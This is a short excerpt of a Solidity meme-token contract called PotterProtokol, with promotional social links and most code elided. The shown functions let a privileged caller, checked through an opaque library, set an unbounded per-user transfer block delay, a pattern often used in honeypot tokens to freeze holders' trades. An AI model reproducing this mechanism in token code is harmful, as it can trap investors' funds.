...
/*
*
* Project HermioneTrumpPutinHarryPotterMuskWorldWar | HTP
*
* Telegram: https://t.me/+ygUJioNVCTU4Y2Jh
*
* Twitter: https://twitter.com/HermioneTrump01
*
*/
...
contract PotterProtokol is IERC20, Ownable, LibreMount {
    ...
    function blockFilter(address _user) internal view {
            require(block.number >= _block[_user] + _blockDelay);
    }
    ...
    function updBlockDelay(uint256 _newBlockDelay) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _blockDelay = _newBlockDelay;
    }
}